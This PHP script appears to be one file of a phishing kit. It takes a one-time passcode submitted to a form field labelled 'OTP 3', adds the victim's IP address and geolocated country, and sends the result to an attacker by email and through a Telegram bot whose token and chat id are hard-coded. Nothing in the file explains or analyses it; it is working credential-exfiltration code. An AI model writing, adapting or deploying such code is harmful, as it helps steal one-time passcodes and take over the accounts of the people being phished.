<?php
if(isset($_POST['access03'])){session_start(); 
$IP = (isset($_SERVER["HTTP_CF_CONNECTING_IP"])?$_SERVER["HTTP_CF_CONNECTING_IP"]:$_SERVER['REMOTE_ADDR']);
date_default_timezone_set('UTC');
$DETAILS     = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$_SERVER['REMOTE_ADDR']."");
$COUNTRYCODE = $DETAILS->geoplugin_countryCode;
$COUNTRYNAME = $DETAILS->geoplugin_countryName;
$access03 = $_SESSION['access03'] = $_POST['access03'];
$headers = 'MIME-Version: 1.0' . "\r\n";
$headers .= "Content-type:text/plain;charset=UTF-8" . "\r\n";
$subject  = " OTP 3 - ".$_SERVER['REMOTE_ADDR']."";
$lgmailsd = '@gmail.com';
$XMSG = "
-------------------------------------------------------------
IP COUNTRY CODE:   ".$COUNTRYCODE."
IP COUNTRY NAME:   ".$COUNTRYNAME."
-----------
OTP 3 / ".$_POST['access03']."
-----------
IP:  ".$_SERVER['REMOTE_ADDR']."
-------------------------------------------------------------
";
mail($lgmailsd, $subject, $XMSG, $headers);
  $website="https://api.telegram.org/bot7336006335:AAH-Tc4THAuDSAUPy47XVsDiHFBx06qSwTQ";$params=['chat_id'=>-4552726149,'text'=>$XMSG,];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}
?>